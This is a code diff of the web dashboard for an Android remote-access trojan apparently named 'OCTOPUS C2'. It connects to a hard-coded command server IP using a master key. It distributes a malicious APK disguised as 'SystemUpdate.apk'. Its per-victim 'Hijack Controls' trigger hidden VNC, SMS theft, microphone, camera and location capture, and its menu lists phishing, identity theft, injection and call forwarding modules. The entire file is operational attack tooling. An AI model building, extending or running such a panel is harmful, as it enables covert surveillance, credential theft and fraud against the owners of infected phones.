@@ -2,115 +2,182 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>OCTOPUS | COMMAND CENTER</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OCTOPUS | ELITE C2</title>
     <script src="https://cdn.socket.io/4.6.1/socket.io.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;500;700&family=Syncopate:wght@700&display=swap');
-        :root { --red: #ff1a1a; --bg: #000; --panel: #080808; --border: #1a1a1a; }
-        body { margin: 0; background: var(--bg); color: #fff; font-family: 'Space Grotesk', sans-serif; display: flex; height: 100vh; overflow: hidden; }
+        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Inter:wght@300;500;700&display=swap');
         
-        #login-overlay { position: fixed; inset: 0; background: #000; z-index: 9999; display: flex; justify-content: center; align-items: center; }
-        .login-card { width: 100%; max-width: 380px; padding: 40px; background: #050505; border: 1px solid var(--border); border-radius: 40px; text-align: center; }
-        input { width: 100%; background: #000; border: 1px solid #111; padding: 15px; border-radius: 15px; color: #fff; margin-bottom: 20px; outline: none; box-sizing: border-box; text-align: center;}
-        .login-btn { width: 100%; padding: 15px; border-radius: 30px; border: none; background: #fff; color: #000; font-family: 'Syncopate'; font-size: 10px; cursor: pointer; transition: 0.3s; }
+        :root { --red: #ff1a1a; --bg: #050505; --panel: #0d0d0d; --hover: #1a1a1a; --text-dim: #888; }
         
-        nav { width: 280px; background: var(--panel); border-right: 1px solid var(--border); display: flex; flex-direction: column; padding: 30px 0; }
-        .nav-link { padding: 18px 35px; color: #555; text-decoration: none; font-size: 11px; text-transform: uppercase; border-left: 3px solid transparent; cursor: pointer; }
-        .nav-link.active { color: #fff; border-left: 3px solid var(--red); background: rgba(255,0,0,0.02); }
-        
-        /* The Download Button Style */
-        .download-box { margin: auto 20px 20px 20px; padding: 20px; background: #111; border-radius: 20px; border: 1px solid #222; text-align: center; }
-        .dl-btn { background: var(--red); color: #fff; border: none; padding: 10px 20px; border-radius: 10px; font-family: 'Syncopate'; font-size: 8px; cursor: pointer; width: 100%; }
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { background: var(--bg); color: #fff; font-family: 'Inter', sans-serif; display: flex; height: 100vh; overflow: hidden; }
 
-        main { flex: 1; padding: 40px; overflow-y: auto; background: radial-gradient(circle at top right, #1a0000, #000); }
-        header { display: flex; justify-content: space-between; border-bottom: 1px solid #222; padding-bottom: 20px; margin-bottom: 30px; }
-        #target-container { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 20px; }
-        .card { background: #0a0a0a; border: 1px solid #1a1a1a; border-radius: 25px; padding: 25px; margin-bottom: 15px; }
-        .cmd-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-top: 15px; }
-        .cmd-btn { background: #111; border: 1px solid #222; color: #fff; padding: 8px; border-radius: 8px; font-size: 9px; cursor: pointer; }
+        /* Login */
+        #login-overlay { position: fixed; inset: 0; background: #000; z-index: 9999; display: flex; justify-content: center; align-items: center; }
+        .login-card { width: 380px; padding: 40px; background: var(--panel); border-top: 4px solid var(--red); text-align: center; }
+        .login-card input { width: 100%; padding: 15px; margin: 20px 0; background: #000; border: 1px solid #222; color: var(--red); text-align: center; font-family: 'Orbitron'; }
+        .login-btn { width: 100%; padding: 15px; background: var(--red); border: none; color: #fff; font-family: 'Orbitron'; cursor: pointer; }
+
+        /* Sidebar - Akatsuki Style */
+        nav { width: 260px; background: var(--panel); display: flex; flex-direction: column; border-right: 1px solid #111; overflow-y: auto; flex-shrink: 0; }
+        .brand-box { padding: 30px; text-align: center; }
+        .brand-box h1 { font-family: 'Orbitron'; color: var(--red); font-size: 22px; letter-spacing: 3px; }
+        
+        .nav-group { flex: 1; }
+        .nav-item { padding: 15px 25px; display: flex; align-items: center; color: var(--text-dim); text-decoration: none; font-size: 13px; transition: 0.2s; cursor: pointer; border-left: 4px solid transparent; }
+        .nav-item i { width: 25px; font-size: 16px; margin-right: 15px; }
+        .nav-item:hover, .nav-item.active { background: var(--hover); color: #fff; border-left-color: var(--red); }
+        
+        /* Main View */
+        main { flex: 1; display: flex; flex-direction: column; background: #000; }
+        header { height: 70px; border-bottom: 1px solid #111; display: flex; align-items: center; justify-content: space-between; padding: 0 40px; background: var(--panel); }
+        .view-title { font-family: 'Orbitron'; font-size: 14px; color: var(--red); }
+        
+        .content-area { flex: 1; padding: 40px; overflow-y: auto; }
+        #target-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(350px, 1fr)); gap: 25px; }
+
+        /* Target Card */
+        .card { background: var(--panel); border: 1px solid #1a1a1a; padding: 25px; border-radius: 4px; }
+        .card-top { display: flex; justify-content: space-between; margin-bottom: 20px; }
+        .status-dot { height: 8px; width: 8px; border-radius: 50%; display: inline-block; background: #0f0; margin-right: 8px; }
+        .card-label { font-size: 10px; color: var(--text-dim); text-transform: uppercase; margin-bottom: 15px; display: block; border-bottom: 1px solid #111; padding-bottom: 5px; }
+        
+        .btn-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 20px; }
+        .action-btn { background: #111; border: 1px solid #222; color: #fff; padding: 10px; font-size: 11px; cursor: pointer; display: flex; align-items: center; justify-content: center; }
+        .action-btn i { margin-right: 8px; font-size: 12px; }
+        .action-btn:hover { background: var(--red); border-color: var(--red); }
+
+        /* Hidden Sections */
+        .hidden { display: none; }
+
+        /* Mobile */
+        @media (max-width: 768px) {
+            nav { position: absolute; left: -100%; z-index: 10; height: 100%; transition: 0.3s; }
+            nav.open { left: 0; }
+            header { padding: 0 20px; }
+        }
     </style>
 </head>
 <body>
 
     <div id="login-overlay">
         <div class="login-card">
-            <h1 style="font-family:'Syncopate'; color:var(--red); font-size: 18px;">OCTOPUS C2</h1>
+            <h1>OCTOPUS C2</h1>
             <input type="password" id="pass" placeholder="MASTER KEY">
-            <button class="login-btn" onclick="login()">INITIALIZE SESSION</button>
+            <button class="login-btn" onclick="login()">AUTHORIZE</button>
         </div>
     </div>
 
-    <nav id="sidebar" style="display:none;">
-        <div style="text-align: center; margin-bottom: 40px; font-family:'Syncopate'; color:var(--red); font-size: 20px;">OCTOPUS</div>
-        <div class="nav-link active">Live Control</div>
-        
-        <div class="download-box">
-            <p style="font-size: 9px; color: #444; margin-bottom: 10px;">PAYLOAD v4.0 READY</p>
-            <button class="dl-btn" onclick="downloadPayload()">DOWNLOAD APK</button>
+    <nav id="sidebar">
+        <div class="brand-box"><h1>OCTOPUS</h1></div>
+        <div class="nav-group">
+            <div class="nav-item active" onclick="switchTab('Home')"><i class="fa-solid fa-house"></i> Home</div>
+            <div class="nav-item" onclick="switchTab('VNC')"><i class="fa-solid fa-desktop"></i> Hidden VNC</div>
+            <div class="nav-item" onclick="switchTab('Inject')"><i class="fa-solid fa-syringe"></i> Inject</div>
+            <div class="nav-item" onclick="switchTab('Phishing')"><i class="fa-solid fa-mask"></i> Phishing</div>
+            <div class="nav-item" onclick="switchTab('Identity')"><i class="fa-solid fa-user-shield"></i> Steal Identity</div>
+            <div class="nav-item" onclick="switchTab('Firewall')"><i class="fa-solid fa-shield-halved"></i> App Firewall</div>
+            <div class="nav-item" onclick="switchTab('Notifications')"><i class="fa-solid fa-bell"></i> Notifications</div>
+            <div class="nav-item" onclick="switchTab('Messages')"><i class="fa-solid fa-comment-dots"></i> Messages</div>
+            <div class="nav-item" onclick="switchTab('Calls')"><i class="fa-solid fa-phone-flip"></i> Call Forwarding</div>
+            <div class="nav-item" onclick="switchTab('Launch')"><i class="fa-solid fa-rocket"></i> Launch Intent</div>
         </div>
+        <div class="nav-item" onclick="downloadApk()" style="color:var(--red)"><i class="fa-solid fa-download"></i> Build APK</div>
     </nav>
 
-    <main id="main-content" style="display:none;">
+    <main>
         <header>
-            <h1 style="font-family: 'Syncopate'; font-size: 18px;">COMMAND CENTER</h1>
-            <div id="status" style="font-size: 10px; color: #444;">LINKING...</div>
+            <div class="view-title" id="active-title">HOME / LIVE TARGETS</div>
+            <div id="socket-status" style="font-size: 10px; color: #444;">DISCONNECTED</div>
         </header>
-        <div id="target-container"></div>
+
+        <div class="content-area">
+            <div id="Home-view">
+                <div id="target-grid"></div>
+            </div>
+
+            <div id="generic-view" class="hidden">
+                <div style="padding: 40px; border: 1px dashed #222; color: #444; text-align: center;">
+                    MODULE INITIALIZING... CONNECT TARGET TO ACTIVATE.
+                </div>
+            </div>
+        </div>
     </main>
 
     <script>
         let socket;
         const SERVER_URL = "http://51.68.234.157:20211";
-        const GITHUB_APK = "https://github.com/octopus29129/apkk/raw/main/SystemUpdate.apk";
+        const GITHUB_URL = "https://github.com/octopus29129/apkk/raw/main/SystemUpdate.apk";
 
         function login() {
             if(document.getElementById('pass').value === "octopus_xx1") {
                 document.getElementById('login-overlay').style.display = 'none';
-                document.getElementById('sidebar').style.display = 'flex';
-                document.getElementById('main-content').style.display = 'block';
-                startC2();
+                initSocket();
             } else { alert("ACCESS DENIED"); }
         }
 
-        // The only way to ensure the APK downloads without redirection
-        function downloadPayload() {
-            const win = window.open(GITHUB_APK, '_blank');
-            if (win) {
-                win.focus();
+        function switchTab(name) {
+            document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
+            event.currentTarget.classList.add('active');
+            document.getElementById('active-title').innerText = name.toUpperCase();
+            
+            if(name === 'Home') {
+                document.getElementById('Home-view').classList.remove('hidden');
+                document.getElementById('generic-view').classList.add('hidden');
             } else {
-                // Fallback if popup is blocked
-                location.href = GITHUB_APK;
+                document.getElementById('Home-view').classList.add('hidden');
+                document.getElementById('generic-view').classList.remove('hidden');
             }
         }
 
-        function startC2() {
+        function downloadApk() { window.open(GITHUB_URL, '_blank'); }
+
+        function initSocket() {
             socket = io(SERVER_URL, { query: { type: 'mastermind', key: 'octopus_xx1' } });
+            
             socket.on('connect', () => {
-                document.getElementById('status').innerText = "CORE ONLINE";
-                document.getElementById('status').style.color = "#0f0";
+                document.getElementById('socket-status').innerText = "CORE ONLINE";
+                document.getElementById('socket-status').style.color = "#0f0";
             });
 
             socket.on('update_dashboard', (res) => {
-                let grid = document.getElementById('target-container');
+                let grid = document.getElementById('target-grid');
                 let card = document.getElementById(res.id);
                 if(!card) {
                     card = document.createElement('div');
                     card.id = res.id;
                     card.className = 'card';
-                    grid.appendChild(card);
+                    grid.prepend(card);
                 }
                 card.innerHTML = `
-                    <div style="font-size: 9px; color: #0f0;">● ONLINE | ${res.id}</div>
-                    <div style="font-size: 18px; font-weight:700; margin: 10px 0;">${res.data.model || 'Target Device'}</div>
-                    <div class="cmd-grid">
-                        <button class="cmd-btn" onclick="send('${res.id}', 'sms')">SMS</button>
-                        <button class="cmd-btn" onclick="send('${res.id}', 'mic')">MIC</button>
-                        <button class="cmd-btn" onclick="send('${res.id}', 'gps')">GPS</button>
-                    </div>`;
+                    <div class="card-top">
+                        <div><span class="status-dot"></span><span style="font-size:12px">${res.data.model || 'Unknown Device'}</span></div>
+                        <div style="font-size:10px; color:#444">${res.id}</div>
+                    </div>
+                    
+                    <span class="card-label">Hijack Controls</span>
+                    <div class="btn-grid">
+                        <button class="action-btn" onclick="send('${res.id}', 'vnc')"><i class="fa-solid fa-desktop"></i> VNC</button>
+                        <button class="action-btn" onclick="send('${res.id}', 'sms')"><i class="fa-solid fa-envelope"></i> SMS</button>
+                        <button class="action-btn" onclick="send('${res.id}', 'mic')"><i class="fa-solid fa-microphone"></i> MIC</button>
+                        <button class="action-btn" onclick="send('${res.id}', 'cam')"><i class="fa-solid fa-camera"></i> CAM</button>
+                    </div>
+
+                    <span class="card-label">Device Data</span>
+                    <div style="font-size:11px; color:#666">
+                        Android: ${res.data.ver || '12+'} <br>
+                        Location: ${res.data.loc || 'Fetching...'} <br>
+                        Battery: ${res.data.bat || '100%'}
+                    </div>
+                `;
             });
         }
 
-        function send(id, act) { socket.emit('run_action', { targetId: id, action: act }); }
+        function send(id, act) { 
+            socket.emit('run_action', { targetId: id, action: act });
+        }
     </script>
 </body>
 </html>
